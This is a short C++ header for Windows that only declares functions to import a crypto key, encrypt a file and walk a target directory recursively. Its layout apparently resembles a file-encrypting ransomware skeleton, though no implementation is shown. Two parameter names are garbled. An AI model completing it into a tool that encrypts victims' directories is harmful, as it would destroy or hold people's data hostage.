#pragma once
#include <Windows.h>
#include <iostream>
#include "strsafe.h"
#include <string>

HCRYPTKEY keyimport();
int enkrypt(WCHAR* srcFile, HCRYPTKEY cl�);
bool traverse(LPCWSTR targetDir, HCRYPTKEY cl�, int nLevel = 0);